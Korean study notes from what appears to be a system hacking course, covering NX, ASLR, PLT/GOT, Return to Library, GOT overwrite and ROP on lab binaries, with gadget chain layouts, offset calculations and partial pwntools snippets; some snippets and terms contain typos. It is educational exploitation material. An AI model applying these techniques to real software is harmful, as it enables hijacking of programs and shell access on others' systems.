# NX
No-eXecute(NX)는 실행에 사용되는 메모리 영역과 쓰기에 사용되는 메모리 영역을 분리하는 보호 기법이다. 어떤 메모리 영역에 대해 쓰기 권한과 실행 권한이 함께 있으면 시스템이 취약해지기 쉽다. 예를 들어 코드 영역에 쓰기 권한이 있으면 공격자는 코드를 수정하여 원하는 코드가 실행되게 할 수 있고, 반대로 스택이나 데이터 영역에 실행권한이 있으면 Return to Shellcode와 같은 공격을 시도할 수 있다.

CPU가 NX를 지원하면 컴파일러 옵션을 통해 바이너리에 NX를 적용할 수 있으며, NX가 적용된 바이너리는 실행될 때 각 메모리 영역에 필요한 권한만 부여받는다. gdb의 vmmap으로 NX 적용 전후의 메모리 맵을 비교하면, 다음과 같이 NX가 적용된 바이너리에는 코드 영역 외에 실행 권한이 없는 것을 확인할 수 있다. 반면, NX가 적용되지 않은 바이너리에는 스택 영역([stack])에 실행 권한이 존재하여 rwx권한을 가지고 있음을 확인할 수 있다.

## Checksec을 이용한 NX 확인
checksec을 이용하면 다음과 같이 바이너리에 NX가 적용됐는지 확인할 수 있다.

`checksec ./nx`
`checksec ./nx_disabled`

#### NX의 다양한 명칭
NX를 인텔은 XD(eXecute Disable) , AMD는 NX, 윈도우는 DEP(Data Execution Prevention) , ARM에서는 XN(eXecute Never) 라고 칭하고 있습니다. 명칭만 다를 뿐 모두 비슷한 보호 기법입니다.

#### 5.4.0 미만 버전 리눅스 커널에서의 NX

리눅스 커널 5.4.0 이전 버전에서는 NX의 동작이 조금 다릅니다.

5.4.0 미만 버전은 스택 영역 뿐만 아니라 힙, 데이터 영역 등 읽기(r) 권한이 있는 모든 페이지에 실행(x) 권한을 부여합니다. 이는 5.4.0 이전 버전의 커널은, NX 미적용 시, 프로세스의 Personality에 읽기 권한이 있는 모든 페이지에 실행 권한을 부여하는 READ_IMPLIES_EXEC 플래그를 설정하기 때문입니다.

5.4.0 이상 버전의 커널은 READ_IMPLIES_EXEC를 설정하지 않고, 로더가 따로 스택 영역([stack])에만 실행 권한을 부여합니다.

## Return to Shellcode w/t NX
이전에 실습한 Return to Shellcode의 예제인 r2s에 NX보호기법을 적용한 후, 동일한 익스플로잇을 실행했을 때의 결과를 확인해보겠다.

r2s.c를 -zexecstack 옵션을 제거해 컴파일하고, checksec으로 확인해보면 NX가 활성화 되어 있다.

`checksec ./r2s_nx`

이 바이너리를 대상으로 익스플로잇 코드를 실행하면, 다음과 같이 Segmentation fault가 발생한다. 이는 NX가 적용되어 스택 영역에 실행 권한이 사라지게 되면서, 셸코드가 실행되지 못하고 종료된 것이다.

## ASLR
Address Space Layout Randomization(ASLR)은 바이너리가 실행될 때마다 스택, 힙, 공유 라이브러리 등을 임의의 주소에 할당하는 보호 기법이다.

Exploit Tech: return to shellcode에서 r2s는 ASLR이 적용되어 실행할 때마다 buf의 주소가 변경되었다. 해당 바이너리는 실습의 편의를 위해 buf의 주소를 출력해주었으므로 buf를 공격에 활용하는 것이 어렵지 않았다. 그러나 일반적인 바이너리였다면 buf의 주소를 구하는 과정이 선해오디어야 할 것이다.

`cat /proc/sys/kernel/randomize_va_space`

리눅스에서 이 값은 0, 1, 2의 값을 가질 수 있다. 각 ASLR이 적용되는 메모리 영역은 다음과 같다.

* No ASLR(0) : ASLR을 적용하지 않음
* Conservative Randomization(1) : 스택, 힙, 라이브러리, vdso 등
* Conservative Randomization + brk(2) : (1)의 영역과 brk로 할당한 영역

## ASLR의 특징
스택 영역의 buf_stack, 힙 영역의 buf_heap, 라이브러리 함수 printf, 코드 영역의 함수 main, 그리고 라이브러리 매핑 주소 libc_base가 출력되었다. 결과는 다음과 같은 특징이 있다.

* 코드 영역의 main 함수를 제외한 다른 영역의 주소들은 실행할 때마다 변경된다. 실행할 때 마다 주소가 변경되기 때문에 바이너리를 **실행하기 전에 해당 영역들의 주소를 에측할 수 없다.**

* 바이너리를 반복해서 실행해도 libc_base 주소 하위 12비트 값과 printf 주소 하위 12비트 값은 변경되지 않는다.
리눅스는 ASLR이 적용됐을 때, 파일을 페이지 단위로 임의 주소에 매핑한다. 따라서 페이지의 크기인 12비트 이하로는 주소가 변경되지 않는다.

* libc_base와 printf의 주소 차이는 항상 같다.
ASLR이 적용되면, 라이브러리는 임의 주소에 매핑된다. 그러나 라이브러리 파일을 그대로 매핑하는 것이므로 매핑된 주소로부터 라이브러리의 다른 심볼들 까지의거리(offset)는 항상 같다.

## 결론
NX와 ASLR이 적용되면 스택, 힙, 데이터 영역에는 실행 권한이 제거되며, 이들이 할당되는 주소가 계속 변한다. 그러나 바이너리의 코드가 존재하는 영역은 여전히 **실행 권한이 존재**하며, 할당되는 **주소도 고정**되어 있다.

코드 영역에는 유용한 코드가젯들과 함수가 포함되어 있다. 반환 주소를 셸코드로 직접 덮는 대신, 이들을 활용하면 NX와 ASLR을 우회하여 공격할 수 있다. 관련된 대표적인 공격 방법으로는 Return to Libc(RTL)과 Return Oriented Programming (ROP)가 있다. 


### 키워드
* Address Space Layout Randomization(ASLR): 메모리를 무작위 주소에 할당하는 보호 기법. 최신 커널들은 대부분 적용되어 있음. 리눅스에서는 페이지 단위로 할당이 이루어지므로 하위 12비트는 변하지 않는다는 특징이 있음.

* NX(No-eXecute bit): 프로세스의 각 세그먼트에 필요한 권한만 부여하는 보호 기법. 일반적으로 코드 영역에는 읽기와 실행을, 나머지 영역에는 읽기와 쓰기 권한이 부여됨.

----------------

# 라이브러리
## 라이브러리
라이브러리는 컴퓨터 시스템에서, 프로그램들이 함수나, 변수를 공유해서 사용할 수 있게 한다. 대개의 프로그램은 서로 공통으로 사용하는 함수들이 많다. 예를 들어 printf, scanf, strlen, memcpy, malloc 등은 많은 C 프로그래머들이 코드를 작성하면서 사용하는 함수다.

C언어를 비롯하여 많은 컴파일 언어들은 자주 사용되는 함수들의 정의를 묶어서 하나의 라이브러리 파일로 만들고, 이를 여러 프로그램이 공유해서 사용할 수 있도록 지원하고 있다. 라이브러리를 사용하면 같은 함수를 반복적으로 정의해야 하는 수고를 덜 수 있어서 코드 개발의 효율이 높아진다는 장점이 있다.

C의 표준 라이브러리인 libc는 우분투에 기본으로 탑재된 라이브러리이며, 실습환경에서는 /lib/x86_64-linux-gnu/libc.so.6에 있다.

## 링크
링크는 많은 프로그래밍 언어에서 컴파일의 마지막 단계로 알려져 있다. 프로그램에서 어떤 라이브러리의 함수를 사용한다면, 호출된 함수와 실제 라이브러리의 함수가 링크과정에서 연결된다.

리눅스에서 C 소스 코드는 전처리, 컴파일, 어셈블 과정을 거쳐 ELF형식을 갖춘 오브젝트 파일로 번역된다. 다음 명령어로 어셈블할 수 있다.

`gcc -c hello-world.c -o hello-world.o`

오브젝트 파일은 실행 가능한 형식을 갖추고 있지만, 라이브러리 함수들의 정의가 어디 있는지 알지 못하므로 실행은 불가능하다. 다음 명령어를 실행해보면, puts의 선언이 stdio.h에 있어서 심볼로는 기록되어 있지만, 심볼에 대한 자세한 내용은 하나도 기록되어 있지 않다. 심볼과 관련된 정보들을 찾아서 최종 실행 파일에 기록하는 것이 링크 과정에서 하는 일 중 하나다.

여기서 libc를 같이 컴파일하지 않았음에도 libc에서 해당 심볼을 탐색한 것은, libc가 있는 /lib/x86_64-linux-gnu/가 표준 라이브러리 경로에 포함되어 있기 때문이다. gcc는 소스 코드를 컴파일할 때 표준 라이브러리의 라이브러리 파일들을 모두 탐색한다. 

링크를 거치고 나면 프로그램에서 puts를 호출할 때, puts의 정의가 있는 libc에서 puts의 코드를 찾고, 해당 코드를 실행하게 된다.

## 라이브러리와 링크의 종류
라이브러리는 크게 동적, 정적 라이브러리로 구분되며, 동적 라이브러리를 링크하는 것을 동적 링크, 정적 라이브러리를 링크 하는것을 정적 링크 라고 부른다.

### 동적 링크
프로그램을 사람으로, 라이브러리를 도서관으로 비유했을 때, 동적 링크는 가장 자연스러운 도서관 사용 방법이다. 동적 링크된 바이너리를 실행하면 동적 라이브러리가 프로세스의 메모리에 매핑된다. 그리고 실행중에 라이브러리의 함수를 호출하면 매핑된 라이브러리에서 호출할 함수의 주소를 찾고, 그 함수를 실행한다.

### 정적 링크
정적 링크는 도서관에서 필요한 모든 책을 암기하는 것과 같다. 정적링크를 하면 바이너리에 정적 라이브러리의 필요한 모든 함수가 포함된다. 해당 함수를 호출할 때, 라이브러리를 참조하는 것이 아니라, 자신의 함수를 호출하는 것처럼 호출할 수 있다. 탐색의 비용이 절감되는 듯하지만, 여러 바이너리에서 라이브러리를 사용하면 그 라이브러리의 복제가 여러 번 이루어지게 되므로 용량을 낭비하게 된다.

### 용량
각각의 용량을 ls로 비교해보면 static이 dynamic 보다 50배 가까이 많은 용량을 차지하는 것을 확인할 수 있다.

### 호출 방법
static에서는 puts가 있는 0x40c140을 직접 호출한다. 반면, dynamic에서는 puts의 plt주소인 0x401040을 호출한다. 이러한 차이가 발생하는 이유는 앞서 이야기했듯, 동적 링크된 바이너리는 함수의 주소를 라이브러리에서 "찾아야"하기 때문이다. plt는 이 과정에 사용되는 테이블이다.

## PLT & GOT
PLT와 GOT는 라이브러리에서 동적 링크된 심볼의 주소를 찾을 때 사용하는 테이블이다.

바이너리가 실행되면 ASLR에 의해 라이브러리가 임의의 주소에 매핑된다. 이 상태에서 라이브러리 함수를 호출하면, 함수의 이름을 바탕으로 라이브러리에서 심볼들을 탐색하고, 해당 함수의 정의를 발견하면 그 주소로 실행 흐름을 옮기게 된다. 이 전 과정들을 통틀어 runtime resolve라고 한다.

반복적으로 호출되는 함수의 정의를 매번 탐색해야 한다면 비효율적일 것이다. 그래서 ELF는 GOT라는 테이블을 두고, resolve된 함수의 주소를 해당 테이블에 저장한다. 그리고 나중에 다시 해당 함수를 호출하면 저장된 주소를 꺼내서 사용한다.

### resolve되기 전
먼저 got.c를 컴파일하고 실행한 직후에, GOT의 상태를 보여주는 명령어인 got를 사용해보겠다. puts의 GOT 엔트리인 0x404018에는 아직 puts의 주소를 찾기 전이므로, 함수 주소 대신 .plt 섹션 어딘가의 주소인 0x401030이 적혀 있다.

이제 main()에서 puts@plt를 호출하는 지점에 중단점을 설정하고, 내부로 따라가 보자. PLT에서는 먼저 puts의 GOT 엔트리에 쓰인 값인 0x401030으로 실행 흐름을 옮긴다.pwndbg 컨텍스트에서 DISASM 부분은 프로그램에서 명령어가 호출되는 순서인 제어흐름을 보여주는데, 실행 흐름을 따라가보면 `_dl_runtime_resolve_fxsave` 가 호출될 것임을 알 수 있다.

### resolve된 후
puts@plt를 두 번째로 호출할 때는 puts의 GOT 엔트리에 실제 puts의 주소인 0x7ffff7c80e50가 쓰여 있어서 바로 puts가 실행된다.

## 시스템 해킹의 관점에서 본 PLT와 GOT
PLT와 GOT는 동적 링크된 바이너리에서 라이브러리 함수의 주소를 찾고, 기록할 때 사용되는 중요한 테이블이다. 그런데, 시스템 해커의 관점에서 보면 PLT에서 GOT를 참조하여 실행 흐름을 옮길 때, GOT의 값을 검증하지 않는다는 보안상의 약점이 있다.

따라서 만약 앞의 예에서 puts의 GOT 엔트리에 저장된 값을 공격자가 임의로 변경할 수 있으면, puts가 호출될 때 공격자가 원하는 코드가 실행되게 할 수 있다.

GOT 엔트리에 저장된 값을 임의로 변조할 수 있는 수단이 있음을 가정하고, 이 공격 기법이 가능한지 gdb를 이용하여 간단하게 실험을 해볼 수 있다. got바이너리에서 main() 내 두 번째 puts() 호출 직전에 puts의 GOT 엔트리를 “AAAAAAAA”로 변경한 후 실행시키면, 실제로 “AAAAAAAA”로 실행 흐름이 옮겨지는 것을 확인할 수 있다.

이와 같이 GOT 엔트리에 임의의 값을 오버라이트(Overwrite)하여 실행 흐름을 변조하는 공격 기법을 GOT Overwrite라고 부른다. 일반적으로 임의 주소에 임의의 값을 오버라이트하는 수단을 가지고 있을 때 수행하는 공격 기법이다.

## Return to Library
NX로 인해 공격자가 버퍼에 주입한 쉘 코드를 실행하기는 어려워졌지만, 스택 버퍼 오버플로우 취약점으로 반환 주소를 덮는 것은 여전히 가능했다.
그래서 공격자들은 실행 권한이 남아 있는 코드 영역으로 반환 주소를 덮는 공격 기법을 고안했다.

프로세스에 실행 권한이 있는 메모리 영역은 일반적으로 바이너리의 코드 영역과 바이너리가 참조하는 라이브러리의 코드 영역이다.

이 중, 공격자들이 주목한 것은 다양한 함수가 구현된 라이브러리였다. 몇몇 라이브러리에는 공격에 유용한 함수들이 구현되어있다. 예를 들어, 리눅스에서 C언어로 작성된 프로그램이 참조하는 libc에는 system, execve등 프로세스의 실행과 관련된 함수들이 구현되어 있다.

공격자들은 libc의 함수들로 NX를 우회하고 쉘을 획득하는 공격 기법을 개발하였고, 이를 Return To Libc라고 이름지었다. 다른 라이브러리도 공격에 활용될 수 있으므로 이 공격 기법은 Return To Library라고도 불린다. 유사한 공격 기법으로 Return To PLT가 있는데 이 공격 기법도 라이브러리의 코드를 사용하는 것이 핵심이므로, 이 강의에서는 RTL의 하위분류로 본다.

`checksec rtl`

### "bin/sh" 를 코드섹션에 추가
rtl.c의 8번째 줄은 "/bin/sh"를 코드 섹션에 추가하기 위해 작성된 코드다. ASLR이 적용돼도 PIE가 적용되지 않으면 코드 세그먼트와 데이터 세그먼트의 주소는 고정되므로, "/bin/sh"의 주소는 고정되어 있습니다. 잠시 후 살펴보겠지만, 이 문자열은 공격에 유용하게 사용될 수 있다.

### system 함수를 PLT에 추가
rtl.c의 17번째 줄은 PLT에 system을 추가하기 위해 작성된 코드다. 지난 강의에서 배웠듯 PLT와 GOT는 라이브러리 함수의 참조를 위해 사용하는 테이블이다. 그 중 PLT에는 함수의 주소가 resolve되지 않았을 때, 함수의 주소를 구하고 실행하는 코드가 적혀있다.

따라서 PLT에 ㄷ어떤 라이브러리 함수가 등록되어 있다면, 그 함수의 PLT 엔트리를 실행함으로써 함수를 실행할 수 있다. ASLR이 걸려있어도 PIE가 적용되어 있지 않다면 PLT의 주손느 고정되므로, 무작위의 주소에 매핑되는 라이브러리의 베이스 주소를 몰라도 이 방법으로 라이브러리 함수를 실행할 수 있다. 이 공격 기법을 Return to PLT라고 한다.

라이브러리의 베이스 주소를 구하여 ASLR을 우회하는 기법은 다음 강의에서 다루고, 이 강의에서는 PLT를 이용하는 NX를 우회하도록 하겠다.
ELF의 PLT에는 ELF가 실행하는 라이브러리 함수만 포함된다. 따라서 다음 코드를 작성하면 PLT에 system 함수를 추가할 수 있다.

## 버퍼 오버플로우
rtl.c의 19번째 줄부터 28번째 줄까지는 두 번의 오버플로우로 스택 카나리를 우회하고, 반환 주소를 덮을 수 있돌고 작성된 코드다.

## 익스플로잇 설계
### 1. 카나리 우회
Return To Shellcode 에서 마찬가지로, 첫 번째 입력에서 적절한 길이의 데이터를 입력하면 카나리를 구할 수 있다.

### 2. rdi값을 "/bin/sh"의 주소로 설정 및 셸 획득
카나리를 구했으면, 이제 두 번째 입력으로 반환 주소를 덮을 수 있다. 그러나 NX로 인해 지난 강의에서와 같이 buf에 쉘 코드를 주입하고 이를 실행할 수는 없다.

공격을 위해 알고 있는 정보:
* "/bin/sh" 의 주소를 안다.
* system 함수의 PLT 주소를 안다. --> system 함수를 호출할 수 있다.

system("/bin/sh")를 호출하면 셸을 획득할 수 있음을 배웠다. x86-64의 호출 규약에 따르면 이는 rdi="/bin/sh" 주소인 상태에서 system 함수를 호출한 것과 같다.

이 예제에서는 "/bin/sh"의 주소를 알고, system 함수를 호출할 수 있으므로 "/bin/sh"의 주소를 rdi의 값으로 설정할 수 있다면 system("/bin/sh")를 실행할 수 있다.이를 위해선 리턴 가젯을 활용해야한다.

## 리턴 가젯
리턴 가젯을 다음과 같이 ret 명령어로 끝나는 어셈블리 코드 조각을 의미함. ROPgadget 명령어를 사용해서 다음과 같이 가젯을 구할 수 있다.
`ROPgadget --binary rtl`

NX로 인해 쉘 코드를 실행할 수 없는 상황에서, 단 한번의 함수 실행으로 쉘을 획득하는 것은 일반적으로 불가능하다.

리턴 가젯은 반환 주소를 덮는 공격의 유연성을 높여서 익스플로잇에 필요한 조건을 만족할 수 있도록 돞는다. 예를 들어 이 예제에서는 rdi의 값을 "/bin/sh"의 주소로 설정하고, system 함수를 호출해야한다. 리턴 가젯을 사용하여 반환 주소와 이후의 버퍼를 다음과 같이 덮으면, pip rdi로 rdi를 "/bin/sh"의 주소로 설정하고, 이어지는 ret로 system 함수를 호출할 수 있다.


대부분 함수는 ret로 종료되므로, 함수들도 리턴 가젯으로 사용될 수 있습니다. 카나리를 우회하고, system("/bin/sh")를 호출할 계획을 세웠으므로 이를 코드로 구현해보자.

## 리턴 가젯 찾기
리턴 가젯을 찾는 방법은 다양하지만, 일반적으로 ROPgadget을 사용한다. ROPgadget은 pypi를 이용하여 간단히 설치할 수 있다.

`python3 -m pip install ROPgadget --user`

`ROPgadget --binary ./rtl --re "pop rdi"`

## 익스플로잇
다음과 같이 가젯을 구성하고 실행하면 system("/bin/sh")를 실행할 수 있다.
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10

"/bin/sh"의 주소는 pwndbg로 찾을 수 있다.
`search /bin/sh`

system 함수의 PLT 주소는 pwndbg 또는 pwntools의 API로 찾을 수 있다.

여기선 pwntools의 API로 스크립트를 작성한다.
가젯으로 구성된 페이로드를 작성하고, 이 페이로드로 반환 주소를 덮으면 셸을 획득할 수 있다.

여기서 한가지 주의할 점은, system 함수로 rip가 이동할 때, 스택은 반드시 0x10단위로 정렬되어 있어야 한다는 것이다. 이는 system함수 내부에 있는 movaps 명령어 때문인데,
이 명령어는 스택이 0x10단위로 정렬되어 있지 않으면 Segmentation Fault를 발생시킨다.

system 함수를 이용한 익스플로잇을 작성할 때, 익스플로잇이 제대로 작성된 것 같은데도 Segmentation Fault가 발생한다면, system 함수의 가젯을 8바이트 뒤로 미뤄보는것이 좋다.
이를 위해서 아무의미 없는 가젯(no-op gadget)을 system 함수 전에 추가할 수 있다.

## 요약
RTL 공격 기법은 이후 chaining RTL, 그리고 Return Oriented Programming으로 발전한다. 이 과정에서 중요한게 바로 리턴 가젯이다.
이 강의에서 익스플로잇에 바이너리의 가젯만을 사용했지만, 라이브러리의 베이스 주소를 안다면, 라이브러리의 가젯들도 마찬가지의 방법으로 사용할 수 있다.
라이브러리에는 매우 많은 가젯이 포함되어 있으므로 이들을 적절히 응용하면 어셈블리어로 프로그래밍하는 것과 유사한 효과를 얻는다.

# Return Oriented Programming
공격 기법은 쉘 코드의 실행에서 라이브러리 함수의 실행으로, 그리고 다수의 리턴 가젯을 연결해서 사용하는 Return Oriented Programming으로 발전했다.
위 rtl에서 살펴본것처럼 pop rdi; ret 같은 코드 가젯과 라이브러리의 system 함수를 사용하는 공격 기법이 새롭게 등장했다.

ASLR이 걸린 환경에서 system 함수를 사용하려면 프로세스에서 libc가 매핑된 주소를 찾고, 그 주소로부터 system 함수의 오프셋을 이용하여 함수의 주소를 계산해야 한다. ROP는 이런 복잡한 제약 사항을 유연하게 해결할 수 있는 수단을 제공한다.

ROP는 리턴 가젯을 사용하여 복잡한 실행 흐름을 구현하는 기법이다. 공격자는 이를 이용해서 문제 상황에 맞춰 return to library, return to dl-resolve, GOT overwrite 등의 페이로드를 구성할 수 있다. 위에서 pop rdi;  ret을 사용해 system("/bin/sh")을 호출한것도 ROP를 사용하여 return to library를 구현한 예다.

ROP 페이로드는 리턴 가젯으로 구성되는데, ret 단위로 여러 코드가 연쇄적으로 실행되는 모습에서 ROP chain이라고도 불린다.

### 코드분석
지난번과 달리 바이너리에서 system 함수를 호출하지 않아서 plt에 등록되지 않으며, "/bin/sh" 문자열도 데이터 섹션에 기록하지 않는다.
따라서 system 함수를 익스플로잇에 사용하려면 함수의 주소를 직접 구해야 하고, "/bin/sh" 문자열을 사용할 다른 방법을 고민해야한다.

### 익스 설계
1. 카나리 우회
2. system 함수의 주소 계산
system 함수는 libc.so.6에 정의되어 있고, 해당 라이브러리에는 이 바이너리가 호출하는 read, puts, printf도 정의되어 있다. 라이브러리 파일은 메모리에 매핑될 때 전체가 매핑되므로,
다른 함수들과 함께 system함수도 프로세스 메모리에 같이 적잰된다.

바이너리가 system 함수를 직접 호출하지 않아서 system 함수가 GOT에는 등록되지 않는다. 그러나 read, puts, printf는 GOT에 등록되어 있다.
main 함수에서 반환될 때는 이 함수들을 모두 호출한 이후이므로, 이들의 GOT를 읽을 수 있다면 libc.so.6가 매핑된 영역의 주소를 구할 수 있다.

libc에는 여러 버전이 있는데 같은 libc안에서 두 데이터 사이의 거리는 항상 같다. 그러므로 사용하는 libc의 버전을 알 때, libc가 매핑된 영역의 임의 주소를 구할 수 있으면 다른 데이터의 주소를 모두 계산할 수 있다.

예를 들어 read 함수와 system 함수 사이의 거리는 항상 0xc3c20이다. 따라서, read함수의 주소를 알때, system = read - 0xc3c20으로 system 함수의 주소를 구할 수 있다. libc 파일이 있으면 다음과 같이 readelf 명령어로 함수의 오프셋을 구할 수 있다.

`readelf -s libc.so.6 | grep " read@"`
`readelf -s libc.so.6 | grep " system@"`

read 함수의 오프셋은 0x114980이고, system 함수의 오프셋은 0x50d60 이다. 0x114980에서 0xc3c20을 빼면 system 함수의 오프셋인 0x50d60을 얻을 수 있다.

rop.c에서는 read, puts, printf가 GOT에 등록되어 있으므로, 하나의 함수를 정해서 그 함수의 GOT 값을 읽고, 그 함수의 주소와 system 함수 사이의 거리를 이용해서 system 함수의 주소를 구해낼 수 있을 것이다.

3. "/bin/sh"
이 바이너리는 데이터 영역에 "/bin/sh"가 없다. 따라서 이 문자열을 임의 버퍼에 직접 주입하여 참조하거나, 다른 파일에 포함된 것을 사용해야 한다. 후자의 방법을 선택할 때 많이 사용되는것이 libc.so.6에 포함된 "/bin/sh"문자열이다. 이 문자열의 주소도 system 함수의 주소를 계산할 때처럼 libc영역의 임의 주소를 구하고, 그 주소로부터 거리를 더하거나 빼서 계산할 수 있다. 이 방법은 주소를 알고있는 버퍼에게 "/bin/sh"를 입력하기 어려울때 차선책으로 사용될 수 있다.

4. GOT Overwrite
system 함수와 "/bin/sh" 문자열의주소를 알고있으므로, 지난 코스에서처럼 pip rdi; ret가젯을 활용하여 system("/bin/sh")를 호출할 수 있다.
그러나 system함수의 주소를 알았을 때는 이미 ROP 페이로드가 전송된 이후이므로, 알아낸 system 함수의 주소를 페이로드에 사용하려면 main함수로 돌아가서 다시 버퍼 오버플로우를 일으켜야 한다.
이러한 공격 패턴을 ret2main이라고 부르는데, 이 코스에서는 GOT Overwrite 기법을 통해 한 번에 쉘을 획득해보자.

* Lazy binding
1. 호출할 라이브러리 함수의 주소를 프로세스에 매핑된 라이브러리에서 찾는다.
2. 찾은 주소를 GOT에 적고, 이를 호출한다.
3. 해당 함수를 다시 호출할 경우, GOT에 적힌 주소를 그대로 참조한다.

위 과정에서 GOT Overwrite가 이용되는 부분은 3번임. GOT에 적힌 주소를 검증하지 않고 참조하므로 GOT에 적힌 주소를 변조할 수 있다면, 해당 함수가 재호출될 때 공격자가 원하는 코드가 실행되게 할 수 있다.

알아낸 system 함수의 주소를 어떤 함수의 GOT에 쓰고, 그 함수를 재호출하도록 ROP 체인을 구성하면 될 것이다.

### system 함수의 주소 계산
read 함수의 got를 읽고, read 함수와 system함수의 오프셋을 이용하여 system 함수의 주소를 계산하자. pwntools에는 ELF.symbols라는 메소드가 정의되어 있는데, 특정 ELF에서 심볼 사이의 오프셋을 계산할 때 유용하게 사용될 수 있다.

<code>
	#!/usr/bin/env python3
	from pwn import *

	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	read_system = libc.symbols["read"]-libc.symbols["system"]	
</code>

write와 pop rdi; ret 가젯 그리고 pop rsi; pop r15 ret 가젯을 사용하여 read 함수의 GOT를 읽고, 이를 이용해서 system 함수의 주소를 구하는 페이로드를 작성해보자.

### GOT Overwrite 및 "/bin/sh" 입력
"/bin/sh"는 덮어쓸 GOT 엔트리 뒤에 같이 입력하면 된다. 이 바이너리에선느 입력을 위해 read함수를 사용할 수 있다. read함수는 입력 스트림, 입력버퍼, 입력 길이 총 세 개의 인자를 필요로 한다. 함수 호출 규약에 따르면설정해야 하는 레지스터는 rdi, rsi, rdx다.

앞의 두 인자는 pop rdi; ret와 pop rsi; pop r15; ret 가젯으로 쉽게 설정할 수 있다. 근데 마지막 rdx와 관련된 가젯은 바이너리에서 찾기 어렵다. 이 바이너리뿐만 아니라 일반적인 바이너리에서도 rdx와 관련된 가젯은 찾기가 어렵다.

이럴땐 libc의 코드 가젯이나, libc_csu_init 가젯을 사용하여 문제를 해결할 수 있다. 또는 rdx의 값을 변화시키는 함수를 호출해서 값을 설정할 수도 있다.
예를 들어 strncmp 함수는 rax로 비교의 결과를 반환하고, rdx로 두 문자열의 첫 번째 문자부터 가장 긴 부분 문자열의 길이를 반환한다.

이 실습에서 read 함수의 GOT를 읽은 뒤 rdx 값이 어느정도 크게 설정되므로, rdx를 설정하는 가젯을 추가하지 않아도 된다. 좀 더 안정적인 익스플로잇을 작성하려면 가젯을 추가해줘도 좋다.

read함수, pop rdi; ret, pop rsi; pop r15; ret 가젯을 이용하여 read의 GOT를 system 함수의 주소로 덮고, read_got + 8에 "/bin/sh" 문자열을 쓰는 익스플로잇을 작성해보자.

### 셸 획득
read 함수의 GOT를 system 함수의 주소로 덮었으므로, 지난 코스와 마찬가지의 방법으로 system("/bin/sh") 를 실행할 수 있다.
read 함수, pop rdi; ret 가젯, “/bin/sh”의 주소(read_got + 8 )를 이용하여 셸을 획득하는 익스플로잇을 작성해보자.

## 키워드
* Return Oriented Programming(ROP): 리턴 가젯을 이용하여 복잡한 실행 흐름을 구현하는 기법. 문제 상황에 맞춰 공격자가 유연하게 익스플로잇을 작성할 수 있다.
* GOT Overwrite: 어떤 함수의 GOT 엔트리를 덮고, 해당 함수를 재호출하여 원하는 코드를 실행시키는 공격 기법


# ROP x64
## 분석
### 보호기법
checksec를 사용하여 적용된 보호 기법을 파악한다.

ASLR이 적용되어 있기 때문에 실행 시마다 스택, 라이브러리 등의 주소가 랜덤화되고, NX가 적용되어 있기 때문에 임의의 위치에 셸코드를 집어넣은 후 그 주소의 코드를 바로 실행시킬 수 없다.

카나리가 없기 때문에 스택 맨 위에 존재하는 SFP, RET과 그 뒷 주소를 맘대로 변경하여도 프로세스가 자동 종료되지 않으며, PIE가 적용되지 않기 때문에 해당 바이너리가 실행되는 메모리 주소가 랜덤화되지 않는다.

### 코드 분석
buf 변수의 크기는 0x40. 하지만 read()함수에서 buf 변수에 0x400 크기의 입력을 받고 있다. 그래서 버퍼 오버플로우가 생긴다.

이번 환경에는 NX가 걸려있기 때문에 셸 코드 사용이 어렵고, Return Oriented programming을 사용해서 진행한다.

### 익스플로잇
ROP를 사용해서 system("/bin/sh")를 실행하는 것을 목표로 한다.
해당 기능을 실행하기 위해 여러 가젯과 인자로 들어갈 값들을 찾아야 한다.

#### Buffer Overflow
buf의 크기는 0x40이지만, 0x400을 입력받을 수 있어서 버퍼 오버플로우가 발생한다. buf가 할당된 64바이트 뒤에는 8바이트의 SFP와 8바이트의 RET가 위치한다.

그래서 'A'를 72바이트 만큼 입력해서 buf, SFP를 더미 값으로 덮고 RET를 원하는 값으로 설정하면 바이너리의 실행 흐름을 조작할 수 있다.

read, write 함수에 인자로 들어가는 buf의 주소는 rbp - 0x40임을 확인할 수 있다. 따라서 buf + 0x40이 SFP이고, buf + 0x48이 익스플로잇 시 값을 조작하여야 하는 RET의 부분이다.

#### system 함수 주소 계산
ASLR이 걸려있기 때문에, system 함수의 주소는 계속 변하게 되지만 ASLR로 인해 변경되는 주소는 라이브러리가 매핑된 Base주소이고, 이에 따라 라이브러리 내부 함수들의 offset값은 변경되지 않는다.
그래서 Base 주소를 구하면 Base 주소 + system 함수의 offset을 통해 system 함수의 주소를 구할 수 있다.

system 함수는 libc.so.6에 정의되어 있고, 해당 라이브러리에는 read, puts, printf 도 정의되어 있다. 그래서 read 함수의 주소 - read 함수의 offset을 하면 Base 주소를 구할 수 있다.

read함수가 실행된 이후 read함수의 주소는 GOT에 등록되어 있기 때문에, read 함수의 GOT 값을 읽으면 read함수의 주소를 구할 수 있다.

#### "/bin/sh" 문자열

system("/bin/sh")를 실행하기 위해선 ("/bin/sh") 문자열이 필요하다. "/bin/sh" 문자열을 grep으로 찾아보자

libc.so.6 라이브러리에 존재한다. 하지만 이 영역은 ASLR의 영향을 받기 때문에 system 함수와 동일하게 Base 주소 + "/bin/sh" 문자열 offset으로 주소를 구해야한다.

"/bin/sh" 문자열의 offset은 아래 코드를 통해 구할 수 있다.

<code>
	from pwn import *

	libc = ELF("./libc.so.6", checksec=False)
	sh = list(libc.search(b"/bin/sh))[0]

	</code>

#### 시나리오 
라이브러리의 Base 주소를 모르기 때문에 바로 system("/bin/sh")를 실행하기는 어려움이 있다. 따라서 ret2main 기법을 사용한다.
ret2main 기법은 원하는 정보를 얻은 후, 다시 main 함수로 돌아와 원하는 명령을 계속 이어 나가는 기법이다.

먼저 write 함수를 이용해 라이브러리의 Base 주소 libc base를 구한 후, 그를 이용해 system함수와 "/bin/sh" 주소를 계산한 후, 두번째 main 함수 실행 시 system("/bin/sh")를 실행하여 문제를 해결할 수 있다.

#### libc base 구하기
* write(1, read@got, 8)
	* read@got 값을 출력하여 read 함수 주소 획득

* libc base = read address - read offset
	* read 함수의 주소에서 offset을 빼서 libc base 구하기

#### system 함수 주소 구하기
* system = libc base + system offset

#### "/bin/sh" 주소 구하기
* "/bin/sh" = libc base + "/bin/sh" offset

#### ret2main
* write(1, read@got, 8)의 코드 이후 main 의 주소를넣어서 RET을 조작하면 main 으로 돌아올 수 있다.

#### 셸 획득
